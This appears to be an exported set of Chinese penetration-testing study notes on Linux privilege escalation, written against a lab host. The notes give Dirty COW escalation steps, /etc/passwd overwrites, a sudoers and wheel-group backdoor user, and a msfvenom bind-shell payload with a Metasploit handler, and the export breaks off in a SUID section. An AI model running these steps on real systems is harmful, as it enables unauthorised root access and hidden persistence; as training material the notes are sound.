{"ID":"20241029090849-x6kghs4","Spec":"1","Type":"NodeDocument","Properties":{"id":"20241029090849-x6kghs4","title":"Linux提权","updated":"20241029201100"},"Children":[{"ID":"20241029091539-qtb9r69","Type":"NodeBlockquote","Properties":{"id":"20241029091539-qtb9r69","updated":"20241029091549"},"Children":[{"ID":"20241029090849-j9mwkmp","Type":"NodeParagraph","Properties":{"id":"20241029090849-j9mwkmp","updated":"20241029091549"},"Children":[{"Type":"NodeText","Data":"Linux安装好系统后里面"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"自带的软件"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"或"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"内核"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"存在的漏洞，比较流行的有“"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"脏牛提权"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"”\nLinux内核提权跟Windows一样，都要下载对应漏洞的脚本进行提权"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241029091603-t5p124w","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241029091603-t5p124w","updated":"20241029091609"},"Children":[{"Type":"NodeText","Data":"Linux提权步骤"}]},{"ID":"20241029091615-3an3abp","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","id":"20241029091615-3an3abp","updated":"20241029091635"},"Children":[{"Type":"NodeText","Data":"信息收集"}]},{"ID":"20241029091636-p74zw57","Type":"NodeTable","TableAligns":[0,0],"Properties":{"colgroup":"min-width: 60px;|width: 892px;","fold":"1","heading-fold":"1","id":"20241029091636-p74zw57","updated":"20241029092551"},"Children":[{"Type":"NodeTableHead","Data":"thead","Children":[{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"命令"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"说明"}]}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"uname -a"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"打印所有可用的系统信息"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 50%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092015-d4wu6ik.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 50%;\"}"},{"Type":"NodeBr","Data":"br"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"uname -r"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"内核版本"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092119-1v9uaaj.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 33%;\"}"},{"Type":"NodeBr","Data":"br"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"uname -m"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"查看系统内核架构（64/32）"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092259-nqr0g80.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeBr","Data":"br"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"cat /proc/version"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"内核信息"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 50%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092326-exllm7k.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 50%;\"}"},{"Type":"NodeBr","Data":"br"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"cat  /etc/issue"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"发行版本信息"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092344-koh0e1u.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 33%;\"}"},{"Type":"NodeBr","Data":"br"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"whoami"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"当前用户"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092356-s2ewojf.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeBr","Data":"br"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"id"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"当前用户信息"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092406-tx8us3z.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 33%;\"}"},{"Type":"NodeText","Data":"​"},{"Type":"NodeBr","Data":"br"}]}]}]},{"ID":"20241029091623-xmunejo","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029091623-xmunejo","updated":"20241029091623"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20241029092917-n81zyen","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","id":"20241029092917-n81zyen","updated":"20241029092932"},"Children":[{"Type":"NodeText","Data":"查找相关版本的内核漏洞"}]},{"ID":"20241029193319-az19yv7","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193319-az19yv7","updated":"20241029193352"},"Children":[{"Type":"NodeText","Data":"exp搜索链接：https://www.exploit-db.com/\nexp下载链接：https://github.com/SecWiki/linux-kernel-exploits"}]},{"ID":"20241029092938-6p2gt92","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20241029092938-6p2gt92","updated":"20241029193423"},"Children":[{"Type":"NodeText","Data":"使用exp，利用漏洞进行提权"}]},{"ID":"20241029193452-v562s2a","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","id":"20241029193452-v562s2a","updated":"20241029193729"},"Children":[{"Type":"NodeText","Data":"Linux脏牛提权过程--dirty.c"}]},{"ID":"20241029193536-oj5gw8o","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-oj5gw8o","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"蚁剑连接shell，打开虚拟终端查看当前用户和内核版本信息"}]},{"ID":"20241029193707-fic0f90","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193707-fic0f90","updated":"20241029193708"},"Children":[{"Type":"NodeText","Data":"如果 Linux Kernel\u003e= 2.6.22则可以利用脏牛进行提权"}]},{"ID":"20241029193536-vrargib","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-vrargib","updated":"20241029193536"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"id\nuname -a\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029193536-x9emx7t","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-x9emx7t","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029115012-2rq3zfk.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029193536-w953vkm","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-w953vkm","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"将脏牛工具上传到/tmp目录下"}]},{"ID":"20241029193536-ywn4v24","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-ywn4v24","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"进入/tmp目录，编译脏牛工具（上传的是源码脚本，编译后才能执行）"}]},{"ID":"20241029193536-6mz7exv","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-6mz7exv","updated":"20241029193536"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"gcc -pthread dirty.c -o dirty -lcrypt\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029193536-6gifia5","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-6gifia5","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029115553-uarj6l2.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029193536-s48amjx","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-s48amjx","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"执行脏牛工具，执行文件，后面是密码，随便定义"}]},{"ID":"20241029193536-ygapdma","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-ygapdma","updated":"20241029193536"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"./dirty 123456\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029193536-csrssvl","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-csrssvl","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029115615-veosq7n.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029193536-9na5gl6","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-9na5gl6","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"验证查看"}]},{"ID":"20241029193536-5nvt7hh","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-5nvt7hh","updated":"20241029193536"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"cat /etc/passwd\nls\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029193536-pib72kg","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-pib72kg","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"用firefart用户进行远程连接，并查看权限"}]},{"ID":"20241029193536-3peih5s","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-3peih5s","updated":"20241029193536"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"ssh firefart@192.168.100.247\nid\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029193536-qk1twlp","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-qk1twlp","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"利用权限提升后创建后门用户"}]},{"ID":"20241029193536-uguv35t","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-uguv35t","updated":"20241029193536"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"mv /tmp/passwd.bak /etc/passwd\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029193536-pjo0dqj","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-pjo0dqj","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"wheel组为普通管理员组，默认不开启，利用wheel组来创建后门用户"}]},{"ID":"20241029193536-nv1r5hi","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-nv1r5hi","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"修改/etc/sudoers配置文件，默认只读，需要修改权限"}]},{"ID":"20241029193536-nwn5g18","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-nwn5g18","updated":"20241029193536"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"chmod u+w /etc/sudoers\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029193536-n4p5vge","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-n4p5vge","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"去除配置文件的105行注释，使wheel组生效"}]},{"ID":"20241029193536-84dd1vj","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-84dd1vj","updated":"20241029193536"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"vim /etc/sudoers\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029193536-af4w7s9","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-af4w7s9","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"创建普通用户gua，并添加wheel组，使其拥有管理员权限"}]},{"ID":"20241029193536-dhmhhf3","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-dhmhhf3","updated":"20241029193536"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"useadd gua\npasswd gua\ngpasswd -a gua wheel\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029193536-akvd2kk","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-akvd2kk","updated":"20241029193536"},"Children":[{"Type":"NodeText","Data":"低级用户切换到root权限"}]},{"ID":"20241029193536-9rdr4k5","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029193536-9rdr4k5","updated":"20241029193625"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"sudo su root\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029193522-27j4yzn","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193522-27j4yzn"}},{"ID":"20241029193523-hc4erau","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","id":"20241029193523-hc4erau","updated":"20241029193752"},"Children":[{"Type":"NodeText","Data":"ubuntu14脏牛提权"}]},{"ID":"20241029193806-5qlijsh","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193806-5qlijsh","updated":"20241029193816"},"Children":[{"Type":"NodeText","Data":"1.蚁剑连接shell，打开虚拟终端查看当前用户和内核版本信息"}]},{"ID":"20241029193819-unoefi2","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193819-unoefi2","updated":"20241029193849"},"Children":[{"Type":"NodeText","Data":"2.可写目录/tmp下上传msf木马，并msf监听"}]},{"ID":"20241029193850-eeg5vaf","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029193850-eeg5vaf","updated":"20241029193928"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"msfvenom -p linux/x86/shell/bind_tcp lport 4567 -f elf \u003e4567.elf\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029093834-ec1wtqq","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029093834-ec1wtqq","updated":"20241029193947"},"Children":[{"Type":"NodeText","Data":"攻击机msf设置"}]},{"ID":"20241029193948-vbzgrpx","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029193948-vbzgrpx","updated":"20241029194045"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"use exploit/multi/handler\nset payload linux/x86/shell/bind_tcp\nset lport 4567\nset rhost 192.168.100.247\nrun\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029193938-q6wzps7","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193938-q6wzps7","updated":"20241029194118"},"Children":[{"Type":"NodeText","Data":"3.获取shell，将简单的shell转换为完全交互式的TTY"}]},{"ID":"20241029194121-we2vumi","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029194121-we2vumi","updated":"20241029194158"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"python -c 'import pty;pty.spawn(\"/bin/bash\")'\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029194052-v2jduit","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029194052-v2jduit","updated":"20241029194230"},"Children":[{"Type":"NodeText","Data":"4.蚁剑将提权的exp上传到目标机，并执行exp"}]},{"ID":"20241029194259-v3t3o4s","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029194259-v3t3o4s","updated":"20241029194314"},"Children":[{"Type":"NodeText","Data":"上传的exp要设置为最高权限"}]},{"ID":"20241029194232-nne72sd","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029194232-nne72sd","updated":"20241029194650"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"chmod 777 dcow-shell-ubuntu\n./dcow-shell-ubuntu -s\n\necho 0 \u003e /proc/sys/vm/dirty_writeback_centisecs\ncp /tmp/.ssh_bak /etc/passwd\nrm /tmp/.ssh_bak\nid\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029194258-3d13uv1","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029194258-3d13uv1","updated":"20241029194258"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029194258-03tk4sa.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029100256-rw5fsv1","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","id":"20241029100256-rw5fsv1","updated":"20241029100301"},"Children":[{"Type":"NodeText","Data":"suid提权"}]},{"ID":"20241029195028-5c59tor","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241029195028-5c59tor","updated":"20241029195408"},"Children":[{"ID":"20241029195211-63rd5u6","Type":"NodeParagraph","Properties":{"id":"20241029195211-63rd5u6","updated":"20241029195211"},"Children":[{"Type":"NodeText","Data":"概念：作用于"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"二进制可执行程序"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"上，当执行这个程序时会临时切换身份为"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"文件所有者身份"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"。如:典型的用户修改密码\n"}]},{"ID":"20241029195237-to0il0h","Type":"NodeParagraph","Properties":{"id":"20241029195237-to0il0h"},"Children":[{"Type":"NodeText","Data":"权限设定方法:\n1.字母表示法:\nchmod u"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"+s"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":" FILE ... → "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"添加"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"SUID权限\nchmod u"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"-s"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"  FILE ... → "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"删除"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"SUID权限\n2.数字表示法:"}]},{"ID":"20241029195020-kbu7qts","Type":"NodeParagraph","Properties":{"id":"20241029195020-kbu7qts","updated":"20241029195230"},"Children":[{"Type":"NodeText","Data":"chmod "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"4755"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":" FILE \u003e"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"添加SUID权限"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"到二进制程序文件  ** 在普通三位数字权限之前，用4代表添加到SUID位\nchmod "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"0xxx"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"  FILE \u003e可以"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"删除"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"文件的SUID\n"}]},{"ID":"20241029195235-ac25ucd","Type":"NodeParagraph","Properties":{"id":"20241029195235-ac25ucd","updated":"20241029195313"},"Children":[{"Type":"NodeText","Data":"文件权限表示:"}]},{"ID":"20241029195314-2s5zkqp","Type":"NodeParagraph","Properties":{"id":"20241029195314-2s5zkqp"},"Children":[{"Type":"NodeText","Data":"文件属主的"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"x权限用s(小写s)代替"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，表示"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"被设置了SUID"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029195311-8loqhm7","Type":"NodeParagraph","Properties":{"id":"20241029195311-8loqhm7"},"Children":[{"Type":"NodeText","Data":"如果属主为"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"没有x权限"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，会显示为"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"大写S"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，表示"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"权限无效"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: 